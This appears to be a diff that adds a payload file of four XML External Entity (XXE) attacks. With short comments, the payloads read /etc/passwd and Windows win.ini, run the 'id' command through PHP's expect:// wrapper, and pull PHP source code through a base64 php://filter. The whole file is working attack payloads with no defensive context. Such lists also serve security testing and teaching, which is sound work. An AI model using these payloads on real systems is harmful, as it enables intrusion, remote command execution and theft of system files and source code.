@@ -1,0 +1,27 @@
+<!-- Classic In-Band XML External Entity (XXE) File Read -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Windows Sensitive File Read -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- PHP Expect Wrapper for RCE (if expect extension enabled) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- PHP Base64 Filter to Read PHP Source Code without Parsing -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<root><data>&xxe;</data></root>
